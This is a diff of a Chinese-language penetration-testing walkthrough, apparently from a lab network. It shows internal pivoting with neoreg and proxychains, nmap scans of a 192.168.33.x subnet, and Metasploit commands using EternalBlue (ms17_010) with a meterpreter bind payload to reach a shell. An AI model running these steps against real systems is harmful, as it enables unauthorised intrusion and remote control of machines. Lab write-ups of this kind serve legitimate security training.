@@ -308,30 +308,73 @@ python neoreg.py -k password -u http://192.168.22.22/tunnel.php -l 0.0.0.0 -p 20
 
 ## 192.168.33.33
 
-我们在攻击机使用nmap扫描33网段 。
+以T2为跳板访问T3，我们在攻击机使用nmap扫描33网段 。
 
 ```
-proxychains4 nmap -Pn -sT 192.168.33.0/24
+proxychains4 nmap -Pn -sT 192.168.33.0/24       //扫描的实在太慢了
 ```
 
-这里使用proxychains4需要配置/etc/proxychains.conf，但是我这里一直出问题。
-
-发现这是开放着445、3389端口的Windows系统
-
-![截图](697434f720c9a4ca03cd5deda3fc5c28.png)
-
-利用永恒之蓝漏洞。
+我们直接对内网33.33服务器进行扫描：
 
 ```
-msfconsole 
-use exploit/windows/smb/ms17_010_psexec
+┌──(root㉿kali)-[/home/tom/桌面]
+└─# proxychains nmap -Pn -sT -sV 192.168.33.33 -p 445,3389
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-31 06:25 CST
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  timeout
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  timeout
+Nmap scan report for 192.168.33.33
+Host is up (0.00057s latency).                         
+
+PORT     STATE  SERVICE       VERSION
+445/tcp  closed microsoft-ds
+3389/tcp closed ms-wbt-server
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.57 seconds
+```
+
+注意：这里使用proxychains4需要配置/etc/proxychains.con
+
+```
+┌──(root㉿kali)-[/home/tom/桌面]
+└─# cat /etc/proxychains.conf
+# proxychains.conf  VER 3.1
+#
+#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
+#
+
+strict_chain
+proxy_dns 
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  172.25.0.13 2001
+
+```
+
+我们通过 msfconsole  利用永恒之蓝漏洞。
+
+```
+proxychains msfconsole    
+search ms17_010
+use 1
 set payload windows/meterpreter/bind_tcp
 set RHOST 192.168.33.33
-options
 run
 ```
 
-![截图](e4187045bf8597e225f3d6585165926b.png)
+![截图](262ae734399167476565dff1d6170ab0.png)
+
+但是太不稳定了，总是超时。
+
+![截图](66589290c6035e2c51328f0a15eb5569.png)
 
 ```
 meterpreter > shell
